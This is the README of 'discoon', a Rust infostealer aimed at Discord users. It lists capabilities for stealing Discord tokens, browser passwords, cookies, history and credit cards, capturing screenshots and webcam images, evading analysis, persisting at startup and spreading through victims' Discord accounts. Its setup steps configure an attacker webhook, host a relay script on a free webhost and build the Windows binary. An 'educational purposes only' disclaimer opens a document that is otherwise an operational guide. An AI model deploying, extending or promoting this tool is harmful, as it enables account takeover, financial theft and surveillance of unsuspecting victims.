### Educational purposes only
Don't use this project maliciously. 

### How it works
This is a malware written in Rust that steals the information the attacker chooses to steal and sends that through a server to the attacker's webhook.

### Features
- Grab IP Address (`grabs IP address`)
- Anti analysis (`detects some malware analysis environments`)
- Webhook protection (`webhook is only stored on the backend making it protected`)
- Auto spread (`automatically spreads the stealer through victim's discord`)
- Site blocker (`prevents the victim from visiting the specified sites`)
- Melt (`self deletes after execution`)
- Copy to temp (`copies the stealer to %TEMP% and places to startup`)
- Trace token (`sends new user token when they change user data also steals credit cards and login information`)
- Steal discord tokens (`steal and decrypt discord tokens`)
- Steal browser passwords (`steals browser passwords`)
- Steal browser cookies (`steals browser cookies`)
- Steal browsing history (`steals browsing history`)
- Steal credit cards (`steals browser credit cards`)
- Take screenshot (`takes a screenshot`)
- Take webcam image (`takes a webcam image`)

### Prerequisites
1. Install [Rust](https://www.rust-lang.org/tools/install)
2. Install windows [tooclahin](https://rust-lang.github.io/rustup/installation/windows.html)

### Setup
1. Go to [upload.php](https://github.com/RadonCoding/discoon/blob/main/assets/upload.php#L3) and set the webhook
2. Get a webhost you can get a free one from [here](https://www.000webhost.com/)
3. Upload the [upload.php](https://github.com/RadonCoding/discoon/blob/main/assets/upload.php) to your webhost
4. Change the `BACKEND` in [constants.rs](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs#L47) to your webhost
5. Configure the options however you like
6. Run `cargo build --release --target=x86_64-pc-windows-msvc`

### Contributing
1. Fork it
2. Create your branch (`git checkout -b my-change`)
3. Commit your changes (`git commit -am 'changed something'`)
4. Push to the branch (`git push origin my-change`)
5. Create new pull request
